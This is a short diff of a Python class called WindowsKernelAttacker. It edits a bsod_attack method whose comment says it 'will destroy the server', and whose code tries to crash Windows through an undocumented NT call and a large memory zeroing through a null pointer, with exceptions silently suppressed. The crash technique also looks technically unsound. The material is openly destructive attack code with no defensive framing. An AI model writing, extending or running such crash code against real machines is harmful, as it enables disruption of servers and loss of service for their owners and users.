@@ -10,8 +10,8 @@ class WindowsKernelAttacker:
         self.ntdll = ctypes.windll.ntdll
         
     def bsod_attack(self):
-        """直接触发蓝屏死亡"""
-        print("💀 尝试直接触发BSOD...")
+        """This will destroy the server immidiatly"""
+        print("activating BSOD...")
         
         try:
             # 方法1: 调用未文档化的NT函数触发崩溃
@@ -25,4 +25,5 @@ class WindowsKernelAttacker:
             null_ptr = ctypes.c_void_p()
             self.kernel32.RtlZeroMemory(null_ptr, 1000000)
         except:
+
             pass
